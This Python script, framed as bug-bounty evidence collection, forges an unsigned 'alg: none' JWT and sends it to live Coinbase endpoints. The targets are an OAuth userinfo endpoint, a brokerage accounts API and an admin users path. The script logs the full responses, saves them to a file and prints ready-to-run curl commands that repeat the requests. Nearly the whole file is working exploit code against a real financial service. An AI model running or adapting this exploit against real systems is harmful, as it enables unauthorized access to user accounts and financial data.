#!/usr/bin/env python3
"""
Capture detailed HTTP request/response for HackerOne evidence
"""

import requests
import json
import base64
from datetime import datetime

def capture_exploit_traffic():
    """Capture detailed HTTP traffic for evidence"""

    print("=" * 70)
    print("Coinbase JWT None Algorithm - Evidence Collection")
    print("=" * 70)

    # Create malicious JWT
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "sub": "999999",
        "email": "security-researcher@example.com",
        "iat": 1785663640,
        "exp": 1817199640,
        "iss": "https://login.coinbase.com/",
        "aud": "https://accounts.coinbase.com",
        "scope": "wallet:accounts:read wallet:user:read wallet:addresses:read openid email profile"
    }

    header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
    jwt_token = f"{header_b64}.{payload_b64}."

    print(f"\n[+] Malicious JWT Created:")
    print(f"    Header: {json.dumps(header)}")
    print(f"    Payload: {json.dumps(payload, indent=6)}")
    print(f"    Token: {jwt_token}")

    evidence = []

    # Test 1: OAuth userinfo
    print("\n" + "=" * 70)
    print("TEST 1: OAuth UserInfo Endpoint")
    print("=" * 70)

    url1 = "https://accounts.coinbase.com/oauth/userinfo"
    headers1 = {
        'Authorization': f'Bearer {jwt_token}',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Accept': 'application/json'
    }

    print(f"\nRequest:")
    print(f"  GET {url1}")
    print(f"  Authorization: Bearer {jwt_token[:50]}...{jwt_token[-20:]}")

    resp1 = requests.get(url1, headers=headers1, timeout=10)

    print(f"\nResponse:")
    print(f"  Status: {resp1.status_code} {resp1.reason}")
    print(f"  Headers:")
    for k, v in resp1.headers.items():
        print(f"    {k}: {v}")
    print(f"\n  Body ({len(resp1.text)} bytes):")
    print(f"  {resp1.text[:1000]}")

    if resp1.status_code == 200:
        print(f"\n  ✓ VULNERABLE: Server accepted JWT with alg:none")

    evidence.append({
        'test': 'OAuth UserInfo',
        'url': url1,
        'method': 'GET',
        'headers': dict(headers1),
        'status': resp1.status_code,
        'response_headers': dict(resp1.headers),
        'response_body': resp1.text[:2000],
        'vulnerable': resp1.status_code == 200
    })

    # Test 2: Brokerage API
    print("\n" + "=" * 70)
    print("TEST 2: Brokerage Accounts API")
    print("=" * 70)

    url2 = "https://accounts.coinbase.com/api/v3/brokerage/accounts"
    headers2 = headers1.copy()

    print(f"\nRequest:")
    print(f"  GET {url2}")
    print(f"  Authorization: Bearer {jwt_token[:50]}...{jwt_token[-20:]}")

    resp2 = requests.get(url2, headers=headers2, timeout=10)

    print(f"\nResponse:")
    print(f"  Status: {resp2.status_code} {resp2.reason}")
    print(f"  Headers:")
    for k, v in resp2.headers.items():
        print(f"    {k}: {v}")
    print(f"\n  Body ({len(resp2.text)} bytes):")
    print(f"  {resp2.text[:1000]}")

    if resp2.status_code == 200:
        print(f"\n  ✓ VULNERABLE: Financial API bypassed with alg:none JWT")

    evidence.append({
        'test': 'Brokerage API',
        'url': url2,
        'method': 'GET',
        'headers': dict(headers2),
        'status': resp2.status_code,
        'response_headers': dict(resp2.headers),
        'response_body': resp2.text[:2000],
        'vulnerable': resp2.status_code == 200
    })

    # Test 3: Admin endpoint
    print("\n" + "=" * 70)
    print("TEST 3: Admin Endpoint Access")
    print("=" * 70)

    url3 = "https://accounts.coinbase.com/api/admin/users"
    headers3 = headers1.copy()

    print(f"\nRequest:")
    print(f"  GET {url3}")
    print(f"  Authorization: Bearer {jwt_token[:50]}...{jwt_token[-20:]}")

    resp3 = requests.get(url3, headers=headers3, timeout=10)

    print(f"\nResponse:")
    print(f"  Status: {resp3.status_code} {resp3.reason}")
    print(f"  Body ({len(resp3.text)} bytes):")
    print(f"  {resp3.text[:1000]}")

    if resp3.status_code == 200:
        print(f"\n  ✓ VULNERABLE: Admin endpoint accessible")

    evidence.append({
        'test': 'Admin Endpoint',
        'url': url3,
        'method': 'GET',
        'headers': dict(headers3),
        'status': resp3.status_code,
        'response_headers': dict(resp3.headers),
        'response_body': resp3.text[:2000],
        'vulnerable': resp3.status_code == 200
    })

    # Generate curl commands for easy reproduction
    print("\n" + "=" * 70)
    print("REPRODUCTION COMMANDS (curl)")
    print("=" * 70)

    for i, test in enumerate(evidence, 1):
        print(f"\n# Test {i}: {test['test']}")
        print(f"curl -X {test['method']} \\")
        print(f"  '{test['url']}' \\")
        for k, v in test['headers'].items():
            print(f"  -H '{k}: {v}' \\")
        print(f"  -v")

    # Save evidence
    with open('http_evidence.json', 'w') as f:
        json.dump(evidence, f, indent=2)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)

    vulnerable_count = sum(1 for e in evidence if e['vulnerable'])
    print(f"\nTotal tests: {len(evidence)}")
    print(f"Vulnerable endpoints: {vulnerable_count}")
    print(f"\nEvidence saved to: http_evidence.json")
    print(f"Timestamp: {datetime.now().isoformat()}")

    if vulnerable_count > 0:
        print(f"\n🔴 CRITICAL: {vulnerable_count} endpoint(s) accept JWT with alg:none")
        print(f"💰 Estimated bounty: $20,000 - $100,000")

    print("\n" + "=" * 70)

    return evidence

if __name__ == '__main__':
    capture_exploit_traffic()
